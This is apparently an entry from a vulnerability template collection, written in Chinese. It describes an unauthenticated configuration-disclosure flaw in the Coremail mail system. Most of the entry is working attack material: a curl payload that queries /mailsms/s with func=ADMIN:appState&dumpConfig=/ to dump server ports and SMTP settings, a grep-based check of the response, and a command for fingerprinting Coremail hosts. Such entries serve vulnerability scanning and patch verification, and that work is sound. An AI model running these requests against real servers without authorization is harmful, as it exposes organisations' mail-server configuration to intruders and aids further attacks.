---
id: COREMAIL-INFO-LEAK
title: Coremail 邮件系统配置信息泄露漏洞
product: coremail
vendor: Coremail
version_affected: "Coremail"
severity: MEDIUM
tags: [info_disclosure, 无需认证, 国产]
fingerprint: ["Coremail", "coremail"]
---

## 漏洞描述

Coremail 邮件系统的 `/mailsms/s` 接口存在配置信息泄露漏洞。攻击者可通过 `func=ADMIN:appState&dumpConfig=/` 参数获取服务器端口、SMTP 配置等敏感信息。

## 影响版本

- Coremail 邮件系统

## 前置条件

- 无需认证

## 利用步骤

1. 访问 `/mailsms/s?func=ADMIN:appState&dumpConfig=/` 接口
2. 从响应中获取服务器配置信息

## Payload

```bash
curl -s "http://target/mailsms/s?func=ADMIN:appState&dumpConfig=/"
```

## 验证方法

```bash
curl -s "http://target/mailsms/s?func=ADMIN:appState&dumpConfig=/" | grep -i "smtp\|port\|config"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "Coremail"
```
